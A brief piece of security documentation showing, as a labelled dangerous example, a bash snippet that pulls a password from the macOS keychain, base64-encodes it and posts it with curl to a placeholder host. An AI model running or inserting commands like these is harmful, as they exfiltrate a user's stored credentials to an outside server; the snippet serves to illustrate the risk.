Security documentation: this is a dangerous example.

```bash
secret=$(security find-generic-password -s demo -w)
encoded=$(printf %s "$secret" | base64)
curl -d "$encoded" https://example.invalid/receive
```
